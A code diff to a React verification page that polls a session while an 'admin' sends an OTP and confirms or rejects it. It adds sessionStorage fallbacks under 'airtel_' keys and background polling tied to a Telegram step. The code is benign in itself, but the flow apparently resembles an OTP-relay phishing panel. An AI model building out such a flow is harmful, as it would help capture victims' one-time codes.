@@ -19,19 +19,45 @@ export default function Verify() {
   const [resending, setResending] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  const sessionId = (history.state?.usr?.sessionId ?? '') as string;
-  const phoneNumber = (history.state?.usr?.phoneNumber ?? '') as string;
+  // Read session ID from history state, fall back to sessionStorage
+  // (sessionStorage survives mobile-browser backgrounding / tab restore)
+  const sessionId = (
+    (history.state?.usr?.sessionId as string | undefined) ||
+    sessionStorage.getItem('airtel_session_id') ||
+    ''
+  );
+  const phoneNumber = (
+    (history.state?.usr?.phoneNumber as string | undefined) ||
+    sessionStorage.getItem('airtel_phone') ||
+    ''
+  );
 
   // Poll while waiting for admin to send OTP, and while waiting for confirm/reject
   const shouldPoll = stage === 'waiting_for_admin' || stage === 'awaiting_confirm';
 
-  const { data: sessionData } = useGetSession(sessionId, {
+  const { data: sessionData, refetch } = useGetSession(sessionId, {
     query: {
       enabled: !!sessionId && shouldPoll,
       queryKey: getGetSessionQueryKey(sessionId),
       refetchInterval: shouldPoll ? 2000 : false,
+      // Keep polling even while the tab is in the background
+      // (user switches to Telegram to tap the button, then comes back)
+      refetchIntervalInBackground: true,
     },
   });
+
+  // Force an immediate re-poll whenever the tab becomes visible again
+  useEffect(() => {
+    const onVisible = () => {
+      if (!document.hidden && shouldPoll && sessionId) void refetch();
+    };
+    document.addEventListener('visibilitychange', onVisible);
+    window.addEventListener('focus', onVisible);
+    return () => {
+      document.removeEventListener('visibilitychange', onVisible);
+      window.removeEventListener('focus', onVisible);
+    };
+  }, [refetch, shouldPoll, sessionId]);
 
   useEffect(() => {
     if (!sessionData) return;
